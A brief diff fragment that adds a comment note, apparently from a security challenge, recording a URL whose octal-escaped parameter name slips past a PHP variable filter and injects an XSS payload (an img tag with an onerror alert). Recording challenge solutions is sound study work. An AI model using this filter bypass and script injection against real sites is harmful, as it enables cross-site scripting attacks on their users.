@@ -41,3 +41,7 @@ ip = "google.com"
 
 
 
+
+# for get requet in php bypass var
+# https://inti.io/challenge0123/?countdown=5&\143ountdown=\74img%20src=x%20onerror=alert(document.domain)\76
+
